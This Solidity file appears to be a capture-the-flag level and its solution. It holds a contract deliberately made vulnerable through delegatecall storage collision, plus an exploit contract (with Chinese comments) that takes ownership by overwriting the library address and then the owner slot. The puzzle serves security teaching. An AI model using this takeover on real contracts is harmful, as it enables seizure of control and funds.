// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

// 思路：1 先正常调用setFirstTime，传入new owner地址，
// 2. 有了新地址后，再自己的合约中写入代码，占用owner的storage, 从此更改owner

contract PreservationExploit {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    Preservation preservation;
    constructor (Preservation _preservation) {
        preservation = _preservation;
    }

    function setTime(uint256 _time) public {
        setOwner(_time);
    }

    function setOwner(uint256 _time) public {
        owner = address(uint160(_time));
    }

    function attack(address addr) public {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(addr)));
    }
}